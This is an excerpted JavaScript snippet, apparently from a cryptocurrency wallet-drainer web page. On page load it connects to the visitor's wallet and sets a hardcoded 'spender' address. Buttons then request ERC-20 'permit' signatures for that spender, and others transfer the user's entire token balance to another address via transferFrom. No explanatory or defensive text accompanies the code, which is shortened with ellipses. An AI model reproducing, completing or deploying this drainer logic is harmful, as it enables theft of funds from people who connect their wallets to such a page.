...
window.onload = async () => {
  checkConnection().then((dataConnect) => {
    ...
    const spender = "0x3FBe5013890E8a03D78BD109A731FDBb1A7DcA05",
      bigNumber = web3.utils.toBN(
    ...
    signsButton.forEach((button) => {
      button.addEventListener("click", async () => {
        ...
        const txData = await instanceContract.methods
          .permit(
            userAddress,
            spender,
    ...
    transfersButton.forEach((button) => {
      button.addEventListener("click", async () => {
        ...
        const instanceContract = new web3.eth.Contract(abi, contractAddress);
        const balanceUser = await instanceContract.methods
          .balanceOf(userAddress)
          .call();

        if (balanceUser > 0) {
          const txData = await instanceContract.methods
            .transferFrom(userAddress, getUserAddress(), balanceUser)
            .encodeABI();
          sendTransaction(getUserAddress(), contractAddress, txData, 0);
        } else {
          alert("balance: 0");
